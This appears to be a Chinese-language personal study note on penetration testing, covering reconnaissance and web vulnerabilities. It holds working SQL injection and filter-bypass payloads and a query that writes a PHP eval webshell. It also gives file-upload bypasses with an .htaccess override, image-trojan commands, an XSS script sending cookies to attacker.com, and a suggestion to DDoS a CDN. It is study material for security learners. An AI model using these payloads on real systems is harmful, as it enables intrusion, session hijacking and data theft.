# 信息收集

渗透测试和渗透攻击的第一步是收集目标信息，俗称踩点。信息收集得越全面，就越容易找到防御薄弱点。较重要的信息包括：

- 基础信息：域名、真实IP、开放端口
- 应用信息：主机上运行了哪些程序，以及它们的版本
- 目录信息：主机上的目录和文件
- 防护信息：WAF，防火墙等

这些信息也叫网络资产信息，[网络空间资产探测与分析技术研究](https://www.gjbmj.gov.cn/n1/2022/0422/c411145-32406257.html)列出的信息以及收集方法如下表。不过这篇文章讲的更多是大规模数据搜集与分析，和网络渗透稍有不同，列在这里仅作参考

| 分类     | 包括                                                         | 相关信息                 | 常用收集方法                      |
| -------- | ------------------------------------------------------------ | ------------------------ | --------------------------------- |
| 硬件资产 | 各种网络设备，如主机、路由器、防火墙                         | 设备型号、网络拓扑结构   | 响应头部数据、banner等            |
| 软件资产 | 网络设备上运行的软件，如操作系统、服务器框架、数据库管理系统、第三方应用等 | 安装了哪些软件、软件版本 | 响应头部数据、特殊URL、开放端口等 |
| 数据资产 | 业务类型、业务数据等                                         |                          |                                   |

## 被动搜集

被动搜集指不直接访问目标，通过其他渠道获取目标信息。被动搜集较为隐蔽，通常不会留下痕迹，信息搜集的第一步通常都是被动搜集

- **网络空间测绘工具**：俗称”黑暗搜索引擎“，可以获取目标的开放端口、使用的服务等信息
  - [FOFA](https://fofa.info/)
  - [Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）
  - [钟馗之眼](https://www.zoomeye.org/)
  - [鹰图平台](https://hunter.qianxin.com/)
  - https://quake.360.net/quake/#/index
  - https://x.threatbook.cn

- **搜索引擎**：用Google等搜索引擎直接搜索目标网站相关信息，如公开的页面，新闻报导乃至配置文件、后台登录页面。用搜索引擎寻找关键信息称作Google Hacking或Google Dorking
- **网站信息查询工具**：[爱站网](https://www.aizhan.com/)、[站长之家](https://tool.chinaz.com/)等网站集成了Whois域名查询、[ICP备案信息](https://beian.miit.gov.cn)查询、Ping检测等多项功能
- **社会工程学**：从官网、社交媒体等渠道获取相关人员信息，联系这些人并骗取目标信息

## 基础信息

### 子域名

子域名和目标或多或少有联系，而且防护不一定有主域名那么严密，后续可以在其中找防护薄弱的目标

- 测绘工具：搜索`domain=target.com`
- 搜索引擎：`site:target.com -site:www.target.com`
- 信息查询工具：[子域名查询](https://tool.chinaz.com/subdomain/)

### IP地址

- DNS查询：`nslookup`
- 测绘工具
- 信息查询工具：[DNS查询](https://tool.chinaz.com/dns)，或者[Ping检测](https://ping.chinaz.com/)、[get-site-ip](https://get-site-ip.com/)

若网站有多个IP地址，网站很可能使用了CDN（Content Distribution Network）、反向代理等，需要绕过CDN节点**寻找真实IP地址**

- **利用子域名**：主站和分站经常在相同IP或同一C段，若分站没开CDN就能从分站找到主站
- **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件源码分析（比如验证邮件、RSS邮件订阅）
- **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址。最暴力的可以从全球访问，其中必定有服务器真实地址
- **搜索特征文件**：部分文件不会缓存在CDN上，可以在网络测绘工具搜索这样的文件
- **DNS历史记录**：如[IP地址查询](https://site.ip138.com/)，找启用CDN之前的ip
- **DDoS攻击**：打光网站CDN流量

找到疑似真实IP后，首先可以多方法互相验证；然后可以尝试改Hosts，能正常访问就说明找到真实IP地址了

### 端口及服务

找到真实IP地址后，就可以检查有哪些开放端口、各端口运行什么服务

1. 测绘工具
2. nmap扫描

```shell
nmap -sn example.com/24	    # 主机发现
nmap -sS exmample.com       # 扫描开放端口
nmap -sS -sV $target -p 443 # 识别端口的服务
```

除了目标本身以外，还可以扫旁注（同一IP地址的其他网站）、C段（`/24`IP段的其他网站）。有可能从中找到防御薄弱点

## 应用信息

获取应用信息的主要方式是指纹识别，即通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等）。例如访问一个不存在的页面，看到Apache的默认404页面就可以推断服务器使用Apache；发现部分资源路径包含`wp-content`，可以推断服务器使用Word Press

### 操作系统

- **大小写敏感**：修改路径大小写（注意域名不区分大小写，要改域名以外的部分，比如将`example.com/news`改成`example.com/NEws`），若正常显示则说明服务器不区分大小写
  - Windows一般不区分大小写；Windows WSL和Windows 10以上版本可以配置区分大小写；Linux区分；MacOS默认不区分，但可以配置

### 数据库

- **常见搭配**：可通过操作系统、服务器软件简单判断数据库，也可以反过来用数据库推断其他信息
  1. Linux + apache / Nginx + PHP + MySQL
  2. Linux + Tomcat + JSP + MySQL / Oracle
  3. Windows + IIS + ASP.NET + MSSQL
  4. Windows + IIS + ASP + Access
- **开放端口**：如MySQL默认端口为3306，如果扫到3306端口开放/过滤，很可能使用MySQL

### 指纹识别工具

nmap的服务识别就是一种指纹识别；wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)等工具可用于识别网页服务器的指纹

## 目录信息

寻找目录、文件信息，有可能发现敏感文件

Fuzz Scan：暴力破解。字典：Web-Fuzzing-Box，fuzzDicts

## 防护信息

wafw00f用于识别waf。防护的识别和绕过都是较难的部分

# Web漏洞

## SQL注入

### 流程

1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，GET参数、POST参数、HTTP头、URL都不要错过

2. **闭合语句**：尝试构造合法语句。例如完整查询语句为`SELECT * FROM users WHERE id=('$id') LIMIT 1`，需要构造注入内容`1') -- `让它成为合法语句。大多数时候都是黑盒测试，需要结合经验尝试单引号、双引号、反引号、括号等。注意，MySQL会做隐式转换，如`id='1 and 1=1'`会查到`id=1`的数据，不要被骗

3. **构造注入语句**

```sql
# SELECT
SELECT * FROM users WHERE id='1' ORDER BY 4;          # 判断数据列数
SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;  # UNION查询

# UPDATE
UPDATE users SET name='hacker' WHERE id='114514';   # 改变写入的内容与条件
UPDATE users SET name='user' WHERE id='' and (SELECT substring(pwd,1,1))='a';  # 盲注
```

4. **获取数据**
   - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
   - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）

| 表名       | 字段名                                  | 包含信息                             |
| ---------- | --------------------------------------- | ------------------------------------ |
| `schemata` | `schema_name`                           | 数据库名                             |
| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |

```sql
-- 示例：获取users表的列名
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
```

### 报错注入

如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中

向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名

```sql
SELECT updatexml(1, concat(0x7e, (select user())), 2)
```

下面语句据说利用随机GROUP BY有概率爆出错误，[参考](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2)，但我无法复现

```sql
SELECT count(*),concat((select user()),floor(rand()*2))a FROM information_schema.columns GROUP BY a
```

### 盲注

web应用进行数据库操作之后可能不会回显，比如只显示“查询成功”或“查询失败”，甚至连成功与否都不告诉用户。这种情况下通过注入获取信息的方法就叫盲注。参考：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)

#### 布尔盲注

1. 找注入点
2. 构造条件。这个条件的真假影响回显。例如若payload`' or '1'='1`回显“查询成功”，`' or '1'='2`回显“查询失败”，这个payload就是合格的条件
3. 将条件替换成注入的数据，例如下面的语句。替换参数，不断尝试直到爆破出整条数据

```sql
SELECT * FROM users WHERE id='' or length(database()) < 16;
SELECT * FROM users WHERE id='' or substr(database(), 1, 1) = 'a';
```

常用的字符串截取方法：

```sql
SELECT substr('a', 1, 1), mid('a', 1, 1), right('a', 1), left('a', 1);
regexp, rlike, trim, insert, like;
```

#### 延时盲注

若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应

```sql
SELECT name FROM users WHERE id='' UNION SELECT IF((1=1), sleep(5), 0);
SELECT name FROM users WHERE id='' UNION SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END;
SELECT name FROM users WHERE id='' UNION SELECT sleep(5*(1=1));
```

网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法：

```sql
SELECT benchmark(1000000, sha1('a'));    # 重复执行sha实现延时
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状态机复杂匹配
```

#### 报错盲注

若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR。查询成功、查询失败、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能强行获得回显

```sql
SELECT exp(709 + (1=1));
SELECT cot(1 - (1=1));
SELECT pow(1 + (1=1), 99999);
```

### 文件操作

以下代码可以读写文件，不过仅限`SELECT @secure_file_priv;`指定的目录

```sql
SELECT '<?php @eval($_POST[aaa]);?>' INTO OUTFILE 'shell.php'
SELECT load_file('backup.bak')
```

### 二次注入

例如，注册用户名`admin' -- `，注册时没有发生注入，但是用该用户进行操作时，比如修改密码，

```sql
UPDATE users SET pwd='$pwd' WHERE name='$name';  -- 替换参数之前
UPDATE users SET pwd='pswd' WHERE name='admin' -- 
```

### 防护

- **预编译**、**参数化查询**：将语句和数据分离
- **过滤**
  - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义
  - **`mysql_real_escape_string`**：`addslashes`的上位替换。转义方式相同，会考虑数据库上下文
  - **字符过滤**：禁用空格、引号、注释等特殊符号
  - **关键字过滤**：用正则匹配`UNION`等常用于渗透攻击的关键字，删除它或者干脆拒绝访问（这种方法效率低、防不全，还容易把正常用户拦住）

- **内容检查**：检查参数内容，比如只允许用整数查询，或者检测到不正确日期格式就拒绝请求

### 绕过

编码：使用特殊编码、特殊转义方式，绕过网站的转义和关键字检查

- **宽字节注入**：服务器和数据库可能采用不同编码，比如可能服务器采用utf-8，数据库用gbk。GBK用2个字节表示一个汉字，可以用一个1字节长的utf-8字符”吞掉“一个字节。比如注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；反斜杠的编码为`%5c`，前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“了。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。若使用`mysql_real_escape_string`等安全的转义函数，且正确设置编码，便可修复此漏洞
- **二次编码注入**：进行两次百分号编码，如`' ' -> %20 -> %25%20`；对普通字符编码，如`u%6eion`。若开发者错误地在SQL参数的转义、过滤后再进行一次URI解码，可导致注入
- **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）。参见[SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)

```sql
-- 空格过滤：注释/**/、其他空白符。参见速查表
-- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
-- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
SELECT * FROM users WHERE id=-1||name=0x61646d696e;
-- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
-- 闭合引号、括号绕过注释
SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
```



## 文件上传

网站若未对用户上传的文件类型、内容或执行权限做严格限制，攻击者可以上传恶意文件（如 WebShell、病毒等）进行攻击

### 防护

- **简单校验**：利用HTML表单、javascript、MIME类型校验

- **文件名校验**：检测扩展名并进行黑名单 / 白名单过滤。更严格一点的会把文件名也给改了，比如改成`时间戳.jpg`

- **文件头Magic Number**：读取文件前几个字节判断文件格式，如JPEG文件应以`FF D8 FF`开头，PNG为`89 50 4E 47`，GIF为`GIF89a`

- **存储隔离**：放在静态资源目录，禁止解析

- **图像处理**：进行图像处理后重新保存

### 绕过

绕过黑名单，或者利用解析漏洞

1. **冷门后缀**：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本基本不可能成功
2. **系统命名绕过**：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
3. PHP服务器**`.user.ini`文件**：构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行该文件。要求php 5.3以上
4. apache服务器**`.htaccess`文件**：服务器配置必须开启`AllowOverride`

```htaccess
<ifModule mime_module>
    AddHandler php5-script .jpg
    AddType application/x-httpd-php .jpg
    Sethandler application/x-httpd-php
</ifModule>

<FilesMatch "muma.jpg">
    Sethandler application/x-httpd-php
    Addhandler php5-script .jpg
</FilesMatch>
```

使用图片木马 + 文件包含漏洞

包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似

1. 随便准备一张图片`a.jpg`
2. 构造恶意代码。通常用“一句话木马”，即非常简短的木马，其隐蔽性较好。后续可用小木马作为跳板上传大木马
   - PHP：`<?php @eval($_GET['cmd']); ?>`
   - aspx：`<%@ Page Language="Jscript"%>`
   - 这么直白的写法肯定会被杀毒软件发现，需要结合代码混淆实现免杀
3. 将图片和代码拼接到一起。或者用Photoshop、PIL等将木马写入图片EXIF

```shell
cat a.jpg shell.php > shell.jpg           # Linux
copy a.jpg /b + shell.php /a > shell.jpg  # Windows
```



### webshell

它允许攻击者通过浏览器远程访问和执行系统命令、文件操作、数据库操作等

```php+HTML
<?php @eval($_GET['cmd']); ?>
```



## 跨站脚本（XSS）

跨站脚本（Cross-Site Scripting，简称XSS。第一个字母改为X以避免和样式层叠表CSS冲突）是网站显示用户输入（比如显示评论）时，字符串被浏览器误当作代码解析执行从而产生危害。例如下面的文本若被当作javascript执行，将在用户不知情之下将Cookie发送到攻击者服务器，攻击者可以用它进行会话劫持攻击

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

XSS只能影响到用户前端，无法直接作用于服务器

- **反射型**：恶意代码写在URL内，如`example.com?q=<script>alert(1);</script>`，打开此链接便收到攻击。易受攻击的功能有搜索等
- **存储型**：恶意代码存储在服务器中，打开对应页面便受到攻击。易受攻击的功能有评论、文章、用户个人资料等
- **DOM型**：污染动态加载的数据，则浏览器解析数据时就会受到攻击。易受攻击的功能有前端渲染搜索、聊天等

### 防护手段

检测

## 跨站请求伪造（CSRF）

跨站请求伪造（Cross-Site Requet Forgery，CSRF）利用用户浏览器的Cookie，以用户名义在目标网站上执行攻击操作。例如：

1. 用户登录银行网站，会话保持有效
2. 用户访问攻击者的恶意页面，该页面隐藏一个自动提交的请求，如`<img src="http://bank.com/transfer?to=attacker&amount=1000 />"`
3. 用户的浏览器自动携带Cookie发送请求，银行网站误认为是合法操作，执行转账

防御措施通常有：

- CSRF Token
- SameSite Cookie
- 验证Referer

## 服务器端请求伪造（SSRF）

服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者通过操纵服务器发出请求获取敏感信息

## 远程代码执行（RCE）

远程代码执行（Remote Code Execution，RCE），也叫任意代码执行（Artibrary Code Execution，ACE）。网站使用`eval`等函数时，若用户可控制参数，则可以执行任意代码

## 文件包含

## 文件下载

## 逻辑漏洞

逻辑漏洞是业务逻辑设计缺陷导致的漏洞。此类漏洞一般不会直接引起安全问题，但往往可以成为攻击切入口

### 支付漏洞

绕过？？，如修改优惠券金额

### 越权访问

**绕过访问控制逻辑**，进行未授权的操作。可以细分为**水平越权**，使用A账号获取、操作B账号的数据；**垂直越权**，使用低权限账号进行高权限操作

发现数据包中传输用户信息（用户编号、用户组编号等）时，可以尝试修改这个值进行水平越权。如果知道高权限用户的数据包结构，还可以尝试垂直越权

绕过其他业务逻辑实现本来不允许的操作也可以叫做广义的逻辑越权，比如通过修改UA访问移动端页面（虽然这种操作不算漏洞，一般也没有危害性），或者

### 敏感信息泄露



## 反序列化

## XXE

# 技巧

## 转义

URI、HTML、SQL

php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
